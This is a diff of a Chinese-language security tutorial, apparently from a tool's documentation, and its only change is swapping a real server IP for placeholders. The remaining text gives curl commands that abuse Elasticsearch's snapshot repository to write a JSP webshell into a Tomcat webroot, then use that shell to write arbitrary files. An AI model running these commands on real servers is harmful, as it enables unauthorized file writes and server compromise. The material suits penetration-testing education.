@@ -74,7 +74,7 @@ curl -XPOST http://185.238.248.179:9200/yz.jsp/yz.jsp/1 -d'
 再创建一个恶意的存储库，其中location的值即为我要写入的路径。
 
 ```go
-curl -XPUT 'http://185.238.248.179:9200/_snapshot/yz.jsp' -d '{
+curl -XPUT 'http://xx.x.x.xxx:xxxx/_snapshot/yz.jsp' -d '{
      "type": "fs",
      "settings": {
           "location": "/usr/local/tomcat/webapps/wwwroot/",
@@ -87,7 +87,7 @@ curl -XPUT 'http://185.238.248.179:9200/_snapshot/yz.jsp' -d '{
 存储库验证并创建:
 
 ```go
-curl -XPUT "http://185.238.248.179:9200/_snapshot/yz.jsp/yz.jsp" -d '{
+curl -XPUT "http://xx.x.x.xxx:xxxx/_snapshot/yz.jsp/yz.jsp" -d '{
      "indices": "yz.jsp",
      "ignore_unavailable": "true",
      "include_global_state": false
@@ -96,9 +96,9 @@ curl -XPUT "http://185.238.248.179:9200/_snapshot/yz.jsp/yz.jsp" -d '{
 
 ![](/img/products/yakit/ElasticSearch-5.png)
 
-访问http://185.238.248.179:8080//wwwroot/indices/yz.jsp/snapshot-yz.jsp
+访问http://xx.x.x.xxx:xxxx//wwwroot/indices/yz.jsp/snapshot-yz.jsp
 这就是我们写入的webshell
 该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串
-如：http://185.238.248.179:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了
+如：http://xx.x.x.xxx:xxxx/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了
 
 ![](/img/products/yakit/ElasticSearch-6.png)
